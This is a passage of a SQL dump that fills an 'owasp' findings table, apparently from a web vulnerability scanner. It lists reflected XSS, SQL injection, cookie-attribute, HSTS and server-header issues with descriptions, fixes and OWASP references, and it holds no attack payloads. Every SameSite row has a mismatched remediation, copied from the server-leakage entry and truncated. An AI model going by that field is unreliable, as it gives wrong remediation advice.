(401, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 97, 'High'),
(402, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 97, 'Medium'),
(403, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 97, 'Low'),
(404, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 97, 'Low'),
(405, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 97, 'Low'),
(406, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 97, 'Low'),
(407, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 98, 'High'),
(408, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 98, 'High'),
(409, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 98, 'Medium'),
(410, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 98, 'Low'),
(411, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 98, 'Low'),
(412, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 98, 'Low'),
(413, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 98, 'Low'),
(414, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 99, 'High'),
(415, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 99, 'High'),
(416, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 99, 'Critical'),
(417, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 99, 'Low'),
(418, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 99, 'Low'),
(419, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 99, 'Low'),
(420, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 99, 'Critical'),
(421, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 100, 'High'),
(422, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 100, 'High'),
(423, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 100, 'Low'),
(424, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 100, 'Low'),
(425, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 100, 'Low'),
(426, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 100, 'Low'),
(427, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 101, 'Low'),
(428, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 101, 'Low'),
(429, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 101, 'Low'),
(430, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 101, 'Low'),
(431, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 104, 'High'),
(432, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 104, 'High'),
(433, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 104, 'Low'),
(434, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 104, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(435, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 104, 'Low'),
